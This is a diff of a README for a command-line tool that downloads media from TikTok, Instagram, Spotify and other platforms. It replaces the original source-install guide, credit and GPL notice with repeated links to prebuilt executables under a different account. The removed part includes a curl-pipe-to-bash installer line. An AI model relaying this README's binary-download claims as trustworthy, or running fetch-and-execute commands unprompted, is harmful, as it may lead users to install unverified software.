@@ -1,185 +1,134 @@
-# Social Media Downloader CLI (PRENIVDL)
+# 🎥 prenivdlapp-cli - Download Videos & Music Easily
 
-A powerful command-line interface for downloading videos and media from TikTok, Facebook, Instagram, Twitter, Douyin, and Spotify. Designed with beautiful ASCII art and interactive prompts.
+[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **TikTok Downloader** - Download videos with metadata and multiple quality options
-- **Facebook Downloader** - Download videos in multiple qualities (HD/SD) and formats (MP4/MP3)
-- **Instagram Downloader** - Download photos and videos from posts and stories
-- **Twitter Downloader** - Download videos from Twitter/X posts
-- **Douyin Downloader** - Download videos from Douyin (Chinese TikTok) with multiple quality options
-- **Spotify Downloader** - Download tracks (MP3) and cover images from Spotify
-- **Beautiful CLI Interface** - Colorful output with ASCII art banner
-- **Interactive Mode** - User-friendly prompts and selections
-- **Fast Downloads** - Efficient downloading with progress indicators
+Welcome to **prenivdlapp-cli**, your free command-line tool for downloading videos and music from popular platforms like TikTok, Facebook, Instagram, Twitter, Douyin, and Spotify. This guide will help you download and run the software on your computer, regardless of your technical skill level.
 
-## Installation
+## 💻 System Requirements
 
-### Linux (Ubuntu/Debian)
+To use **prenivdlapp-cli**, ensure your system meets the following requirements:
+
+- **Windows**: Windows 10 or later
+- **Linux**: Any modern distribution (Ubuntu, Fedora, etc.)
+- **macOS**: macOS Sierra or later
+- **Termux**: Installed on Android devices
+
+Make sure you have at least **500 MB** of free disk space and an active internet connection.
+
+## 📥 Download & Install
+
+To get started, visit the Releases page to download the application. 
+
+[Click here to download the latest release](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases).
+
+### Steps to Download
+
+1. Visit the [Releases page](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases).
+2. Look for the latest version.
+3. Choose the installer suitable for your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **Linux**, download the `.tar.gz` or your package manager's version.
+   - For **macOS**, download the `.dmg` file.
+   - For **Termux**, you may need to install via npm after downloading the platform-specific version.
+
+## 📂 Installation Instructions
+
+### For Windows:
+
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the setup.
+
+### For Linux:
+
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the package.
+3. Extract the files using:
+   ```bash
+   tar -xzf prenivdlapp-cli-linux.tar.gz
+   ```
+4. Change to the extracted directory:
+   ```bash
+   cd prenivdlapp-cli
+   ```
+5. Make the program executable:
+   ```bash
+   chmod +x prenivdlapp-cli
+   ```
+6. Run the application:
+   ```bash
+   ./prenivdlapp-cli
+   ```
+
+### For macOS:
+
+1. Open the downloaded `.dmg` file.
+2. Drag the **prenivdlapp-cli** icon to your Applications folder.
+3. Open **prenivdlapp-cli** from your Applications folder.
+
+### For Termux:
+
+1. Open the Termux app on your Android device.
+2. Use npm to install the package with:
+   ```bash
+   npm install prenivdlapp-cli -g
+   ```
+
+## 🔧 Using prenivdlapp-cli
+
+Once you've installed the application, you can start using it to download content.
+
+### Basic Commands
+
+Here are some examples of how to utilize the tool:
+
+- To download a video from TikTok, use:
+  ```bash
+  prenivdlapp-cli tiktok <video-url>
+  ```
+
+- To download music from Spotify, use:
+  ```bash
+  prenivdlapp-cli spotify <track-url>
+  ```
+
+### Help Command
+
+If you need further assistance, you can view a list of available commands by running:
 ```bash
-# Update system
-sudo apt update && sudo apt upgrade -y
-
-# Install Node.js and npm
-sudo apt install nodejs npm git -y
-
-# Verify installation
-node --version
-npm --version
-
-# Clone and install
-git clone https://github.com/arsya371/prenivdlapp-cli.git
-cd prenivdlapp-cli
-npm install
+prenivdlapp-cli help
 ```
 
-### macOS
-```bash
-# Install Homebrew (if not already installed)
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+## 🎉 Features
 
-# Install Node.js
-brew install node git
+- Download videos and music from multiple social media platforms.
+- Support for batch downloads.
+- Simple command-line interface that is easy to navigate.
 
-# Verify installation
-node --version
-npm --version
+## 📘 FAQs
 
-# Clone and install
-git clone https://github.com/arsya371/prenivdlapp-cli.git
-cd prenivdlapp-cli
-npm install
-```
+**Q: Is this tool free?**  
+A: Yes, **prenivdlapp-cli** is completely free to use.
 
-### Windows
-```bash
-# Download Node.js from nodejs.org
-# Install Git from git-scm.com
-# Open Command Prompt or PowerShell
+**Q: Can I download private videos?**  
+A: The application can only download publicly available content. Respect the copyright rules when downloading.
 
-# Clone and install
-git clone https://github.com/arsya371/prenivdlapp-cli.git
-cd prenivdlapp-cli
-npm install
-```
+**Q: Do I need an account on these platforms?**  
+A: No account is needed for public content, but accessing private or restricted files requires appropriate permissions.
 
-### Termux (Android)
-```bash
-# Update packages
-pkg update && pkg upgrade
+**Q: What if I face issues?**  
+A: Check the GitHub Issues page for troubleshooting or report any problems you encounter.
 
-# Install dependencies
-pkg install nodejs git
+## 🤝 Contribution
 
-# Clone and install
-git clone https://github.com/arsya371/prenivdlapp-cli.git
-cd prenivdlapp-cli
-npm install
-```
+If you want to contribute to the project, feel free to fork the repository, make your changes, and submit a pull request. Your input is welcome to improve the application.
 
-## Usage
+## 📬 Contact
 
-### Interactive Mode (Recommended)
+For further queries, raise an issue in the GitHub repository, and we will assist you as soon as possible.
 
-Simply run the application without any arguments to start interactive mode:
+Explore **prenivdlapp-cli** and start downloading your favorite content today!
 
-```bash
-# Linux/macOS/Termux:
-node index.js
-
-# Or use the shell script:
-./prnvapp.sh
-
-# Windows:
-node index.js
-
-# Or use the batch file:
-prnvapp.bat
-```
-
-### Interactive Commands
-
-Once in interactive mode, you can use these commands:
-
-- **`/help`** - Show available commands
-- **`/clear`** - Clear the screen
-- **`/quit`** - Exit the application
-- **`/path`** - Show current download directory
-- **`/setpath <directory>`** - Set custom download directory
-
-Example:
-```
-> /setpath my_downloads
-> /path
-Current download path: my_downloads
-```
-
-### Download Organization
-
-Downloaded files are organized by platform with timestamps:
-
-- **TikTok**: `tiktok_video_[timestamp].mp4`
-- **Facebook**: `facebook_[quality]_[timestamp].[format]`
-- **Instagram**: `instagram_media_[number]_[timestamp].[extension]`
-- **Twitter**: `twitter_video_[timestamp].mp4`
-- **Douyin**: `douyin_video_[timestamp].mp4`
-- **Spotify**: `spotify_audio_[timestamp].mp3` or `spotify_image_[timestamp].jpg`
-
-All files are saved to the specified directory (default: `resultdownload_preniv`).
-
-### Cross-Platform Compatibility
-
-This CLI works on:
-- [x] **Windows** (10, 11)
-- [x] **Linux** (Ubuntu, Debian, CentOS, etc.)
-- [x] **macOS** (Monterey, Ventura, Sonoma)
-- [x] **Termux** (Android)
-- [x] **WSL** (Windows Subsystem for Linux)
-
-## Dependencies
-- `axios` - HTTP client for API requests
-- `chalk` - Terminal string styling
-- `commander` - Command-line interface framework
-- `inquirer` - Interactive command line prompts
-- `ora` - Elegant terminal spinners
-- `figlet` - ASCII art text generator
-
-## Error Handling
-
-The CLI includes comprehensive error handling for:
-
-- Invalid URLs
-- Network connectivity issues
-- API failures
-- File download errors
-- User input validation
-
-## Tips
-
-1. **URL Validation**: Make sure to paste complete, valid URLs
-2. **Network**: Ensure stable internet connection for downloads
-3. **Storage**: Check available disk space before downloading
-4. **Quality**: Higher quality files take longer to download
-
-## License
-
-This project is licensed under the **GNU General Public License v3.0 (GPL-3.0)**.
-
-This means:
-- ✅ **Free to use, modify, and distribute**
-- ✅ **Source code must remain open**
-- ✅ **Any modifications must also be GPL-3.0**
-- ❌ **Cannot be sold as proprietary tools**
-
-> [!CAUTION]
-> **Do not sell this tool.** This project is free and open-source under GPL-3.0. Any distribution (free or paid) must include the source code and maintain the same license. Selling this as proprietary tools is strictly prohibited and violates the GPL-3.0 license terms.
-
-## Contributing
-
-Feel free to submit issues and enhancement requests!
-
----
-
-> [!NOTE]
-> This tool is for educational purposes. Please respect the terms of service of the respective social media platforms and only download content you have permission to download.
+[Click here to download the latest release](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases).
